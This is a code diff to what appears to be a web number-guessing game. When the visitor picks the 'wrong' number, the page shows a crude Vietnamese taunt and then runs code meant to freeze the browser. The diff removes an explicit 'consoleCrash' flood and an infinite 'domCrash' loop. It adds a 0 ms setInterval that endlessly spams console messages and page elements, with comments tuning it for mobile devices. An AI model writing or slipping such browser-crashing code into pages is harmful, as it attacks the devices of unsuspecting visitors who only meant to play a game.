@@ -24,26 +24,23 @@
                 textElement.style.color = "red";
                 textElement.textContent = "Tao biết ngay. Mày chọn số sai vl >:(";
 
-                // 1. Console spam FIRST (very aggressive)
-                (function consoleCrash() {
-                    let i = 0;
-                    while (i < 50000) {          // flood console hard first
-                        console.log("bye bye", i, Math.random());
-                        console.error("bye bye");
-                        console.warn("bye bye");
-                        i++;
-                    }
-                })();
-
-                // 2. Then DOM spam (for mobile + extra pressure)
                 let count = 0;
-                (function domCrash() {
-                    while (true) {
-                        const p = document.createElement("p");
-                        p.textContent = count++;
-                        document.body.appendChild(p);
-                    }
-                })();
+
+                // Soft but continuous spam (works better on mobile)
+                setInterval(() => {
+                    // Console spam
+                    console.log("bye bye", count, Math.random());
+                    console.error("bye bye");
+                    console.warn("bye bye");
+
+                    // DOM spam
+                    const p = document.createElement("p");
+                    p.textContent = count++;
+                    p.style.color = "red";
+                    p.style.margin = "0";
+                    p.style.fontSize = "12px";
+                    document.body.appendChild(p);
+                }, 0); // 0ms = as fast as possible without fully freezing
 
             } else {
                 textElement.style.color = "black";
